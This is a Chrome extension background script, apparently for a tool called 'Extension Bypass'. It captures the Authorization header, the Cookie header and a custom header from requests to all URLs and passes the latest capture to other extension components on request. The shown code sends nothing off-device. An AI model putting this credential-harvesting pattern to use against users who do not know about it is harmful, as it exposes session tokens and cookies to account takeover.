const recordedRequests = [];

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    if (details.requestHeaders) {
      let topLevelUrl = "unknown";

      if (details.initiator) {
        try {
          topLevelUrl = new URL(details.initiator).origin;
        } catch (e) {

        }
      }
      
      let relevantData = {};
      details.requestHeaders.forEach(header => {
        if (header.name.toLowerCase() === 'authorization') {
          relevantData['authorization'] = header.value;
        } else if (header.name.toLowerCase() === 'x-custom-header') { 
          relevantData['x-custom-header'] = header.value;
        } else if (header.name.toLowerCase() === 'cookie') {
          relevantData['cookie'] = header.value;
        }
      });

      if (Object.keys(relevantData).length > 0) {
        const data = {
          topLevelUrl: topLevelUrl,
          iframeUrl: details.url,
          method: details.method,
          ...relevantData
        };
        recordedRequests.length = 0;
        recordedRequests.push(data);
      }
    }
  },
  { urls: ["<all_urls>"] },
  ["requestHeaders"]
);

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getRecordedRequests") {
    const dataToSend = [...recordedRequests];
    recordedRequests.length = 0;
    sendResponse(dataToSend);
    return true;
  }
});

chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason === "update") {
        let newVersion = chrome.runtime.getManifest().version;
        chrome.notifications.create({
            type: 'basic',
            iconUrl: 'images/logo.png',
            title: 'Notice from Extension Bypass',
            message: `Your extension has been updated to the latest ${newVersion} version!`
        });
    }
});